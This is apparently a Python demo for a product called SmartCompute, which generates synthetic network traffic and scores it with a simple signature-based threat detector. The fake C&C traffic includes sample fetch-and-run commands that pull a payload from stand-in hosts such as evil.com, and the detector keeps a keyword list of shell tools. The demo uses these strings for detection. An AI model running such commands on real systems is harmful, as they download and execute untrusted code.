"""
SmartCompute Synthetic Demo
Generates fake network traffic and shows detection capabilities

This demo provides a realistic but synthetic showcase of SmartCompute's
threat detection capabilities without requiring real network data.
"""

import random
import time
import json
from datetime import datetime, timedelta
from typing import Dict, List, Any, Optional
from dataclasses import dataclass, asdict


@dataclass
class NetworkEvent:
    """Represents a network traffic event"""
    timestamp: str
    src_ip: str
    dst_ip: str
    src_port: int
    dst_port: int
    protocol: str
    bytes_sent: int
    bytes_received: int
    duration: float
    flags: List[str]
    payload_snippet: Optional[str] = None
    geo_location: Optional[str] = None


@dataclass
class ThreatAnalysisResult:
    """Result from threat analysis"""
    is_threat: bool
    threat_score: float
    threat_type: Optional[str]
    confidence: float
    processing_time_ms: float
    indicators: List[str]
    recommendations: List[str]


class SyntheticThreatDetector:
    """Synthetic threat detector for demo purposes"""
    
    def __init__(self):
        self.threat_signatures = {
            'brute_force': {
                'pattern': lambda event: event.dst_port in [22, 23, 3389, 21] and 'syn' in event.flags,
                'score_base': 0.8,
                'description': 'Potential brute force attack on authentication service'
            },
            'port_scan': {
                'pattern': lambda event: len(event.flags) > 0 and event.bytes_sent < 100,
                'score_base': 0.6,
                'description': 'Potential port scanning activity'
            },
            'malware_communication': {
                'pattern': lambda event: event.payload_snippet and any(
                    malware_indicator in event.payload_snippet.lower() 
                    for malware_indicator in ['cmd.exe', 'powershell', '/bin/sh', 'wget', 'curl']
                ),
                'score_base': 0.9,
                'description': 'Potential malware command and control communication'
            },
            'data_exfiltration': {
                'pattern': lambda event: event.bytes_sent > 1000000,  # >1MB upload
                'score_base': 0.7,
                'description': 'Potential data exfiltration attempt'
            },
            'suspicious_geo': {
                'pattern': lambda event: event.geo_location in ['Unknown', 'TOR', 'High-Risk'],
                'score_base': 0.5,
                'description': 'Traffic from suspicious geographical location'
            }
        }
        
        self.processing_stats = {
            'total_analyzed': 0,
            'threats_detected': 0,
            'avg_processing_time': 0.0
        }
    
    def analyze(self, event: NetworkEvent) -> ThreatAnalysisResult:
        """Analyze network event for threats"""
        start_time = time.perf_counter()
        
        # Simulate processing delay
        processing_delay = random.uniform(0.001, 0.015)  # 1-15ms
        time.sleep(processing_delay)
        
        threat_score = 0.0
        indicators = []
        threat_type = None
        
        # Check against threat signatures
        for threat_name, signature in self.threat_signatures.items():
            try:
                if signature['pattern'](event):
                    threat_score += signature['score_base']
                    indicators.append(signature['description'])
                    if not threat_type or signature['score_base'] > self.threat_signatures[threat_type]['score_base']:
                        threat_type = threat_name
            except Exception:
                # Handle pattern matching errors gracefully
                continue
        
        # Add randomness for more realistic behavior
        threat_score += random.uniform(-0.1, 0.1)
        threat_score = max(0.0, min(1.0, threat_score))  # Clamp between 0-1
        
        # Determine if this is a threat
        is_threat = threat_score > 0.5
        confidence = min(0.95, threat_score + random.uniform(0.05, 0.15))
        
        # Generate recommendations
        recommendations = []
        if is_threat:
            if threat_score > 0.8:
                recommendations.append("IMMEDIATE: Block source IP and investigate")
                recommendations.append("Log all related traffic for analysis")
            elif threat_score > 0.6:
                recommendations.append("Monitor source IP for additional suspicious activity")
                recommendations.append("Consider rate limiting for this source")
            else:
                recommendations.append("Add to watchlist for monitoring")
        
        # Calculate processing time
        processing_time = (time.perf_counter() - start_time) * 1000
        
        # Update stats
        self.processing_stats['total_analyzed'] += 1
        if is_threat:
            self.processing_stats['threats_detected'] += 1
        
        # Update average processing time
        old_avg = self.processing_stats['avg_processing_time']
        count = self.processing_stats['total_analyzed']
        self.processing_stats['avg_processing_time'] = (old_avg * (count - 1) + processing_time) / count
        
        return ThreatAnalysisResult(
            is_threat=is_threat,
            threat_score=threat_score,
            threat_type=threat_type,
            confidence=confidence,
            processing_time_ms=processing_time,
            indicators=indicators,
            recommendations=recommendations
        )
    
    def get_stats(self) -> Dict[str, Any]:
        """Get processing statistics"""
        stats = self.processing_stats.copy()
        if stats['total_analyzed'] > 0:
            stats['threat_detection_rate'] = (stats['threats_detected'] / stats['total_analyzed']) * 100
        else:
            stats['threat_detection_rate'] = 0.0
        return stats


class SyntheticTrafficGenerator:
    """Generate realistic but synthetic network traffic"""
    
    def __init__(self):
        self.internal_networks = ['192.168.1.', '10.0.0.', '172.16.0.']
        self.external_ips = [
            '8.8.8.8', '1.1.1.1', '208.67.222.222',  # DNS servers
            '13.107.42.14', '52.96.0.0',  # Microsoft
            '140.82.112.4', '192.30.253.113',  # GitHub
            '172.217.16.142', '216.58.194.174',  # Google
        ]
        self.malicious_ips = [
            '198.51.100.1', '203.0.113.1', '192.0.2.1',  # Example IPs
            '45.33.32.156', '104.244.72.115',  # Known bad actors (examples)
        ]
        self.geo_locations = ['US', 'CA', 'GB', 'DE', 'FR', 'JP', 'Unknown', 'TOR', 'High-Risk']
        self.protocols = ['TCP', 'UDP', 'ICMP', 'HTTP', 'HTTPS', 'SSH', 'FTP', 'DNS']
        self.common_ports = [22, 23, 25, 53, 80, 110, 143, 443, 993, 995, 3389, 5432, 3306]
    
    def generate_normal_traffic(self) -> List[NetworkEvent]:
        """Generate normal, benign network traffic"""
        events = []
        
        # DNS queries
        for _ in range(random.randint(5, 15)):
            events.append(NetworkEvent(
                timestamp=self._random_timestamp(),
                src_ip=self._random_internal_ip(),
                dst_ip=random.choice(['8.8.8.8', '1.1.1.1', '208.67.222.222']),
                src_port=random.randint(32768, 65535),
                dst_port=53,
                protocol='UDP',
                bytes_sent=random.randint(50, 150),
                bytes_received=random.randint(100, 300),
                duration=random.uniform(0.001, 0.05),
                flags=['query'],
                geo_location=random.choice(['US', 'CA', 'GB'])
            ))
        
        # HTTPS traffic
        for _ in range(random.randint(10, 25)):
            events.append(NetworkEvent(
                timestamp=self._random_timestamp(),
                src_ip=self._random_internal_ip(),
                dst_ip=random.choice(self.external_ips),
                src_port=random.randint(32768, 65535),
                dst_port=443,
                protocol='HTTPS',
                bytes_sent=random.randint(500, 5000),
                bytes_received=random.randint(1000, 50000),
                duration=random.uniform(0.1, 2.0),
                flags=['syn', 'ack', 'fin'],
                payload_snippet="GET / HTTP/1.1\\r\\nHost: example.com",
                geo_location=random.choice(['US', 'CA', 'GB', 'DE'])
            ))
        
        # Email traffic
        for _ in range(random.randint(2, 8)):
            events.append(NetworkEvent(
                timestamp=self._random_timestamp(),
                src_ip=self._random_internal_ip(),
                dst_ip='outlook.office365.com',
                src_port=random.randint(32768, 65535),
                dst_port=993,
                protocol='IMAPS',
                bytes_sent=random.randint(200, 1000),
                bytes_received=random.randint(500, 5000),
                duration=random.uniform(0.5, 3.0),
                flags=['syn', 'ack'],
                geo_location='US'
            ))
        
        return events
    
    def generate_threat_traffic(self) -> List[NetworkEvent]:
        """Generate suspicious/malicious traffic for testing"""
        threats = []
        
        # SSH Brute Force Attack
        attacker_ip = random.choice(self.malicious_ips)
        target_ip = self._random_internal_ip()
        for attempt in range(random.randint(50, 200)):
            threats.append(NetworkEvent(
                timestamp=self._random_timestamp(base_offset=attempt * 0.1),
                src_ip=attacker_ip,
                dst_ip=target_ip,
                src_port=random.randint(32768, 65535),
                dst_port=22,
                protocol='TCP',
                bytes_sent=random.randint(50, 150),
                bytes_received=random.randint(20, 80),
                duration=random.uniform(0.5, 2.0),
                flags=['syn', 'rst'],
                payload_snippet="SSH-2.0-OpenSSH_7.4",
                geo_location=random.choice(['Unknown', 'High-Risk'])
            ))
        
        # Port Scanning
        scanner_ip = random.choice(self.malicious_ips)
        target_network = random.choice(self.internal_networks)
        for port in random.sample(range(1, 10000), random.randint(20, 100)):
            threats.append(NetworkEvent(
                timestamp=self._random_timestamp(),
                src_ip=scanner_ip,
                dst_ip=f"{target_network}{random.randint(1, 254)}",
                src_port=random.randint(32768, 65535),
                dst_port=port,
                protocol='TCP',
                bytes_sent=random.randint(40, 80),
                bytes_received=0,
                duration=random.uniform(0.001, 0.1),
                flags=['syn'],
                geo_location='TOR'
            ))
        
        # Malware C&C Communication
        for _ in range(random.randint(3, 8)):
            threats.append(NetworkEvent(
                timestamp=self._random_timestamp(),
                src_ip=self._random_internal_ip(),
                dst_ip=random.choice(self.malicious_ips),
                src_port=random.randint(32768, 65535),
                dst_port=random.choice([8080, 8443, 9999, 4444]),
                protocol='TCP',
                bytes_sent=random.randint(100, 500),
                bytes_received=random.randint(200, 1000),
                duration=random.uniform(1.0, 5.0),
                flags=['syn', 'ack', 'psh'],
                payload_snippet=random.choice([
                    "cmd.exe /c whoami",
                    "powershell -enc SGVsbG8gV29ybGQ=",
                    "/bin/sh -c 'curl http://evil.com/payload'",
                    "wget -O /tmp/malware http://badsite.com/binary"
                ]),
                geo_location='High-Risk'
            ))
        
        # Data Exfiltration
        for _ in range(random.randint(1, 3)):
            threats.append(NetworkEvent(
                timestamp=self._random_timestamp(),
                src_ip=self._random_internal_ip(),
                dst_ip=random.choice(self.malicious_ips),
                src_port=random.randint(32768, 65535),
                dst_port=random.choice([443, 8443, 22]),
                protocol='TCP',
                bytes_sent=random.randint(10000000, 100000000),  # 10MB-100MB
                bytes_received=random.randint(1000, 5000),
                duration=random.uniform(30.0, 120.0),
                flags=['syn', 'ack', 'psh', 'fin'],
                payload_snippet="POST /upload HTTP/1.1\\r\\nContent-Type: application/octet-stream",
                geo_location='Unknown'
            ))
        
        return threats
    
    def _random_internal_ip(self) -> str:
        """Generate random internal IP address"""
        network = random.choice(self.internal_networks)
        return f"{network}{random.randint(10, 254)}"
    
    def _random_timestamp(self, base_offset: float = 0.0) -> str:
        """Generate random timestamp"""
        base_time = datetime.now() - timedelta(seconds=base_offset)
        offset = timedelta(seconds=random.uniform(-3600, 0))  # Up to 1 hour ago
        return (base_time + offset).isoformat()


def print_event_summary(events: List[NetworkEvent], title: str):
    """Print summary of events"""
    print(f"\n📋 {title}")
    print("=" * (len(title) + 4))
    
    if not events:
        print("   No events generated")
        return
    
    # Count by protocol
    protocols = {}
    for event in events:
        protocols[event.protocol] = protocols.get(event.protocol, 0) + 1
    
    # Count by destination port
    ports = {}
    for event in events:
        ports[event.dst_port] = ports.get(event.dst_port, 0) + 1
    
    print(f"   Total Events: {len(events)}")
    print(f"   Protocols: {dict(sorted(protocols.items(), key=lambda x: x[1], reverse=True))}")
    print(f"   Top Ports: {dict(sorted(ports.items(), key=lambda x: x[1], reverse=True)[:5])}")
    
    # Show sample events
    print(f"\n   Sample Events:")
    for i, event in enumerate(events[:3]):
        print(f"     {i+1}. {event.src_ip}:{event.src_port} → {event.dst_ip}:{event.dst_port} "
              f"({event.protocol}, {event.bytes_sent}B sent)")


def run_demo():
    """Run the complete SmartCompute synthetic demo"""
    print("🎭 SmartCompute Synthetic Demo")
    print("=" * 40)
    print("📅 Demo Date:", datetime.now().strftime("%Y-%m-%d %H:%M:%S"))
    print("📊 Generating synthetic network traffic for analysis...")
    
    # Initialize components
    traffic_generator = SyntheticTrafficGenerator()
    threat_detector = SyntheticThreatDetector()
    
    # Generate traffic
    print("\n🔄 Generating traffic samples...")
    normal_events = traffic_generator.generate_normal_traffic()
    threat_events = traffic_generator.generate_threat_traffic()
    
    # Print traffic summaries
    print_event_summary(normal_events, "Normal Network Traffic")
    print_event_summary(threat_events, "Suspicious Network Traffic")
    
    # Analyze all traffic
    print("\n🔍 Analyzing traffic for threats...")
    print("-" * 40)
    
    all_events = normal_events + threat_events
    random.shuffle(all_events)  # Mix normal and threat traffic
    
    results = []
    threats_found = []
    
    for i, event in enumerate(all_events):
        result = threat_detector.analyze(event)
        results.append(result)
        
        if result.is_threat:
            threats_found.append((event, result))
            
        # Show progress for longer demos
        if (i + 1) % 20 == 0:
            print(f"   Processed {i + 1}/{len(all_events)} events...")
    
    # Display results
    print(f"\n📊 Analysis Results")
    print("=" * 20)
    
    stats = threat_detector.get_stats()
    print(f"   Events Analyzed: {stats['total_analyzed']}")
    print(f"   Threats Detected: {stats['threats_detected']}")
    print(f"   Detection Rate: {stats['threat_detection_rate']:.1f}%")
    print(f"   Avg Processing Time: {stats['avg_processing_time']:.2f}ms")
    
    # Performance validation
    performance_status = "✅ EXCELLENT" if stats['avg_processing_time'] < 10 else \
                        "✅ GOOD" if stats['avg_processing_time'] < 25 else \
                        "⚠️  ACCEPTABLE" if stats['avg_processing_time'] < 50 else \
                        "❌ SLOW"
    
    print(f"   Performance: {performance_status}")
    
    # Show threat details
    if threats_found:
        print(f"\n🚨 Threat Detection Details")
        print("=" * 28)
        
        for i, (event, result) in enumerate(threats_found[:10]):  # Show top 10
            threat_level = "🔴 CRITICAL" if result.threat_score > 0.8 else \
                          "🟡 HIGH" if result.threat_score > 0.6 else \
                          "🟠 MEDIUM"
            
            print(f"\n   {i+1}. {threat_level} (Score: {result.threat_score:.2f})")
            print(f"      Source: {event.src_ip}:{event.src_port}")
            print(f"      Target: {event.dst_ip}:{event.dst_port}")
            print(f"      Type: {result.threat_type or 'Unknown'}")
            print(f"      Confidence: {result.confidence:.1%}")
            
            if result.indicators:
                print(f"      Indicators: {', '.join(result.indicators[:2])}")
            
            if result.recommendations:
                print(f"      Action: {result.recommendations[0]}")
        
        if len(threats_found) > 10:
            print(f"\n   ... and {len(threats_found) - 10} more threats detected")
    
    # Show accuracy estimation
    print(f"\n📈 Estimated Performance Metrics")
    print("=" * 35)
    
    # Estimate accuracy based on synthetic data
    known_threats = len(threat_events)
    detected_threats = sum(1 for event, result in zip(all_events, results) 
                          if result.is_threat and event in threat_events)
    false_positives = sum(1 for event, result in zip(all_events, results) 
                         if result.is_threat and event in normal_events)
    
    precision = detected_threats / (detected_threats + false_positives) if (detected_threats + false_positives) > 0 else 0
    recall = detected_threats / known_threats if known_threats > 0 else 0
    
    print(f"   Precision: {precision:.1%}")
    print(f"   Recall: {recall:.1%}")
    print(f"   Avg Latency: {stats['avg_processing_time']:.2f}ms")
    
    accuracy_status = "✅ EXCEEDS TARGET" if precision > 0.9 and recall > 0.9 else \
                     "✅ MEETS TARGET" if precision > 0.8 and recall > 0.8 else \
                     "⚠️  NEEDS IMPROVEMENT"
    
    print(f"   Status: {accuracy_status}")
    
    # Export results to JSON
    export_data = {
        'demo_info': {
            'timestamp': datetime.now().isoformat(),
            'version': '1.0.0-beta',
            'total_events': len(all_events),
            'normal_events': len(normal_events),
            'threat_events': len(threat_events)
        },
        'performance_metrics': {
            'avg_processing_time_ms': stats['avg_processing_time'],
            'total_analyzed': stats['total_analyzed'],
            'threats_detected': stats['threats_detected'],
            'detection_rate_percent': stats['threat_detection_rate'],
            'estimated_precision': precision,
            'estimated_recall': recall
        },
        'sample_threats': [
            {
                'threat_score': result.threat_score,
                'threat_type': result.threat_type,
                'confidence': result.confidence,
                'src_ip': event.src_ip,
                'dst_ip': event.dst_ip,
                'dst_port': event.dst_port,
                'indicators': result.indicators[:3],  # Top 3 indicators
                'recommendations': result.recommendations[:2]  # Top 2 recommendations
            }
            for event, result in threats_found[:5]  # Top 5 threats
        ]
    }
    
    with open('/tmp/smartcompute_demo_results.json', 'w') as f:
        json.dump(export_data, f, indent=2)
    
    print(f"\n💾 Results exported to: /tmp/smartcompute_demo_results.json")
    
    print(f"\n🎯 Demo Completed Successfully!")
    print("=" * 30)
    print("   This demo showcases SmartCompute's capabilities using")
    print("   synthetic data. Real-world performance may vary based")
    print("   on network complexity and threat landscape.")
    
    return export_data


if __name__ == "__main__":
    # Quick version when run directly
    print("🎭 SmartCompute Quick Demo")
    print("=" * 26)
    
    try:
        results = run_demo()
        print("\n✅ Demo completed successfully!")
    except Exception as e:
        print(f"\n❌ Demo failed: {e}")
        raise